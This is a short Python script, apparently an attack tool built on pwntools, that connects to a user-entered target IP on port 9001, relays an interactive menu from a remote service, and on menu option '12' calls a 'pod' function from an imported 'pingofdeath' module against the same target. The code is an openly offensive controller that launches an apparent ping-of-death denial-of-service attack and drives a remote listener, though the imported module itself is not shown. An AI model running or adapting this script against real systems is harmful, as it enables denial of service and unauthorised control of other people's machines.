#!/bin/env python3

from pwn import *
from pingofdeath import *

target = input("Enter your target IP: ")
r = remote(target.strip(),9001)
try:
    while True:
        
        while True:
            data = r.recv(1024,0.000001)
            print(data.decode())
            if not data:
                break
        
        opt = input()
        opt = opt.encode()
        if opt == b'12\n':
            pod(target)
        if opt != b'\n':
            r.sendline(opt)
        else:
            print('Do not send empty input!')

except KeyboardInterrupt:
    r.close()
    print("Connection Aborted")
